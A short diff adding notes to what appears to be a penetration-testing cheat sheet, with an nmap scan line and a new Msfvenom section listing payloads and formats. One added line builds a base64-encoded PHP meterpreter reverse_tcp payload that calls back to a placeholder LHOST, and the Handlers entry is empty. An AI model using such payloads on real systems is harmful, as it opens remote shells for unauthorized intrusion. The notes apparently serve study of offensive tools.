@@ -743,3 +743,12 @@ example
 - ``` nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP] ```
 
 **Msfvenom**
+- Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).
+- ``` # msfvenom -l payloads ```
+- ``` # msfvenom --list formats ```
+
+encode
+- ``` # msfvenom -p php/meterpreter/reverse_tcp LHOST={IP} -f raw -e php/base64 ``` The PHP version of Meterpreter was encoded in Base64, and the output format was raw.
+
+Handlers
+- 
